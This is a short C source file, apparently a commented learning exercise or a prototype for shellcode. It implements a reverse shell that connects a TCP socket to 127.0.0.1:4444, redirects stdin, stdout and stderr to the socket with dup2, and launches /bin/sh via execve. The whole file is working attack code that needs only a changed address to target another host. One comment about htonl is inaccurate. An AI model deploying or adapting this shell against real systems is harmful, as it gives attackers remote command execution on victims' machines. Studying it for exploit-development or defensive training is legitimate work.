#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int socketfd;
struct sockaddr_in servaddr;

int main() { 
	//Create socket, which returns the file descriptor so we can interact with it
    socketfd = socket(AF_INET, SOCK_STREAM, 0); //here we specify that it is an ipv4 stream type of communication and protocol is 0 (TCP/IP)

	//Initialize servaddr struct 
    servaddr.sin_family = AF_INET; //address family set to AF_INET(which is ipv4)
    servaddr.sin_port = htons(4444); //htons is neccesary so endianness does not reverse how the port is stored in memory, thus scrambling it
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); //htonl is neccesary so endianness does not reverse how the address is stored in memory, thus scrambling it

    //connect to remote address
    connect(socketfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
    //Create new file descriptors for stdin stdout and stderror, so the client shell will recieve these from our socket 
    dup2(socketfd, 0);
    dup2(socketfd, 1);
    dup2(socketfd, 2);

	//Use execve to excecute /bin/sh from within our program
    execve("//bin/sh", NULL, NULL); //extra slash is to ensure we have to 8bit values to push onto stack later on
}